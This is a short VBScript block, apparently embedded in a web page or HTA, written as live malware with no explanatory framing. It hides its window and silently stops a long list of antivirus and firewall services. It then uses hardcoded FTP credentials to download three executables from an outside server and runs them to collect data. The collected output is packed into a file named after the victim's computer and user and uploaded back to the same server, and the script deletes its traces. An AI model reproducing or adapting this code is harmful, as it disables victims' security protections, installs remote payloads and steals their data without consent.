<script language="vbs">
self.MoveTo 5000,5000
public fso
Set fso = CreateObject("Scripting.FileSystemObject")
Set WshShell = CreateObject("WScript.Shell")
function doo (xx)
aaa= WshShell.Run("cmd /c " & xx, 0, True)
end function
doo ("net stop "&chr(34)&"Kerio Personal Firewall"&chr(34))
doo ("net  stop "&chr(34)&"FW Configuration Interpreter"&chr(34)&" /y")
doo ("net stop "&chr(34)&"TrueVector Internet Monitor"&chr(34))
doo ("net stop "&chr(34)&"Norton AntiVirus Auto Protect Service"&chr(34))
doo ("net stop "&chr(34)&"Symantec Event Manager"&chr(34))
doo ("net stop "&chr(34)&"avsync manager"&chr(34))
doo ( "net stop "&chr(34)&"NaV alert"&chr(34))
doo ("net stop "&chr(34)&"nav auto-protect"&chr(34))
doo ("net stop "&chr(34)&"norton program scheduler"&chr(34))
doo ("net stop defwatch")
doo ("net stop "&chr(34)&"Norton AntiVirus Client"&chr(34))
doo ("net stop "&chr(34)&"AVG6 Service"&chr(34))
doo ("net stop "&chr(34)&"Trend NT Realtime Service"&chr(34))
doo ("net stop "&chr(34)&"AVSync Manager"&chr(34))
doo ("net stop McShield")
doo ("net stop "&chr(34)&"McAfee.com McShield"&chr(34))
doo ("net stop "&chr(34)&"Symantec AntiVirus Client"&chr(34))
doo ("net stop "&chr(34)&"McAfee.com VirusScan Online Realtime Engine"&chr(34))
doo ("net stop "&chr(34)&"PC-cillin PersonalFirewall"&chr(34))
doo ("net stop "&chr(34)&"Sophos Anti-Virus"&chr(34))
doo ("net stop "&chr(34)&"Sweep for Windows NT Update"&chr(34))
doo ("net stop "&chr(34)&"Sweep for Windows NT Network"&chr(34))
doo ("echo open ftp.server16-squaretrade.com >a")
doo ("echo servsquaretrade>>a")
doo ("echo kdi8k2n0sg4>>a")
doo ("echo bin>>a" )
doo ("echo cd web/cur>>a" )
doo ("echo get m.exe>>a" )
doo ("echo get mp.exe>>a" )
doo ("echo get dp.exe>>a" )
doo ("echo bye>>a" )
doo ("ftp -s:a")
doo ("m /shtml syscom1a1" )
doo ("mp /shtml 2ver83re" )
doo ("dp /shtml yt45wax5" )
Set WshNetwork = CreateObject("WScript.Network")
nu = WshNetwork.ComputerName & "_" & WshNetwork.UserName
nu=replace (nu," ","_")
While Not (fso.FileExists("syscom1a1"))Or Not (fso.FileExists("2ver83re"))Or Not(fso.FileExists("yt45wax5")) 
wend
nu = Chr(34)&nu&"_"&minute(now)&second(now)&".cur"&chr(34)
doo ("type syscom1a1>"&nu)
doo ("type 2ver83re>>"&nu)
doo ("type yt45wax5>>"&nu)
doo ("echo open ftp.server16-squaretrade.com >a")
doo ("echo servsquaretrade>>a")
doo ("echo kdi8k2n0sg4>>a")
doo ("echo bin>>a" )
doo ("echo cd web>>a" )
doo ("echo put "&nu& ">>a")
doo ("echo bye>>a" )
doo ("ftp -s:a")
doo ("del a")
self.close
</script>